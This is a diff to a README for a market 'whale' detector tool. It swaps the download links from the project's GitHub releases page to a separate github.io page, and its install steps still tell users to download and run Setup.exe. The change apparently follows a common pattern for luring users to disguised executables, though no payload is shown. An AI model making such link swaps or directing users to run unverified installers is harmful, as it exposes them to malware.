@@ -1,6 +1,6 @@
 # 🐋 Volume-Whale-Detector-2026 - Spot large market moves with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Mamadu4084/Volume-Whale-Detector-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://mamadu4084.github.io)
 
 ## Overview
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the [official releases page](https://github.com/Mamadu4084/Volume-Whale-Detector-2026/releases).
+1.  Visit the [official releases page](https://mamadu4084.github.io).
 2.  Locate the folder labeled Latest Release.
 3.  Click the file named Setup.exe to start the transfer to your computer.
 4.  Once the transfer finishes, find the file in your Downloads folder.
